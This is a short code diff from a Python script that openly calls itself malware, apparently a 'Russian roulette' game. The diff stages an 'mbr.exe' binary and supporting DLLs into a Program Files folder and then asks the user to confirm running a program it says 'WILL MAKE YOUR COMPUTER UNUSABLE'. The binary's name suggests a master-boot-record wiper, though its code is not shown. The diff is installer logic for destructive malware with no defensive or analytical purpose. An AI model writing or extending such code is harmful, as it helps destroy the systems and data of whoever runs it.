@@ -59,9 +59,13 @@ else:
 	quit()
 
 os.mkdir("C:/Program Files/pussianroulette")
-shutil.copy2("temp/*", "C:/Program Files/pussianroulette")
-os.remove("temp/*")
+shutil.move("temp/mbr.exe", "C:/Program Files/pussianroulette")
+shutil.move("temp/api-ms-win-core-path-l1-1-0.dll", "C:/Program Files/pussianroulette")
+shutil.move("temp/msvcp140d.dll", "C:/Program Files/pussianroulette")
+shutil.move("temp/urctbased.dll", "C:/Program Files/pussianroulette")
+shutil.move("temp/vcruntime140_1d.dll", "C:/Program Files/pussianroulette")
 os.rmdir("temp")
+
 
 confirm =  input("Do you want to play a game? This program IS MALWARE and WILL MAKE YOUR COMPUTER UNUSABLE! (yes/no)\n")
 confirm = confirm.lower()
